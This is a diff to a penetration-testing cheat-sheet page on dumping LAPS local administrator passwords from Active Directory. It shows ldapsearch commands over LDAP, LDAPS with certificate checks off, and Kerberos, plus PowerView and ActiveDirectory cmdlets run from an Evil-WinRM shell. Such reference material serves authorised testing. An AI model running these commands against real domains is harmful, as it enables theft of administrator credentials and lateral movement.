@@ -1,16 +1,21 @@
 ---
 title: "ReadLAPSPassword"
-tags: ["Credential Dumping", "Powerview", "ReadLAPSpassword", "Active Directory", "Windows", "LAPS"]
+tags: ["Active Directory", "ReadLAPSPassword", "Credential Dumping", "LAPS", "Powerview", "ReadLAPSpassword", "Windows"]
 ---
 
-### Abuse #1: Read LAPS Password
+{{< filter_buttons >}}
+
+### Read LAPS Password
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+{{< tab set1-1 tab1 active>}}Password{{< /tab >}}{{< tab set1-1 tab2 >}}Kerberos{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
 
 ```console
-ldapsearch -H ldap://<TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' -x -D <USER>@<DOMAIN> -w '<PASSWORD>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+# Password
+ldapsearch -x -H ldap://<TARGET> -D "CN=<USER>,CN=Users,DC=<EXAMPLE>,DC=<COM>" -w '<PASSWORD>' -b 'DC=<EXAMPLE>,DC=<COM>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
 ```
 
 ```console {class="sample-code"}
@@ -47,6 +52,20 @@ result: 0 Success
 # numReferences: 3
 ```
 
+```console
+# Fix 'BindSimple: Transport encryption required.'
+LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://<TARGET> -D "CN=<USER>,CN=Users,DC=<EXAMPLE>,DC=<COM>" -w '<PASSWORD>' -b 'DC=<EXAMPLE>,DC=<COM>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1-1 tab2 >}}
+
+```console
+# Ticket-based Kerberos
+ldapsearch -H ldap://<TARGET> -Y GSSAPI -b 'DC=<EXAMPLE>,DC=<COM>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+```
+
+{{< /tabcontent >}}
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
@@ -60,21 +79,7 @@ result: 0 Success
 *Evil-WinRM* PS C:\Users\bob\Documents> . .\PowerView.ps1
 ```
 
-#### 2. Create a Cred Object (Runas) \[Optional\]
-
-```console
-$username = '<DOMAIN>\<USER>'
-```
-
-```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-```
-
-```console
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
-```
-
-#### 3. Read LAPS Password
+#### 2. Read LAPS Password
 
 ```console
 Get-DomainComputer <TARGET_COMPUTER> -Properties ms-Mcs-AdmPwd
@@ -82,7 +87,7 @@ Get-DomainComputer <TARGET_COMPUTER> -Properties ms-Mcs-AdmPwd
 
 ```console
 # Or activedirectory module
-Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
+Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
 ```
 
 ```console {class="sample-code"}
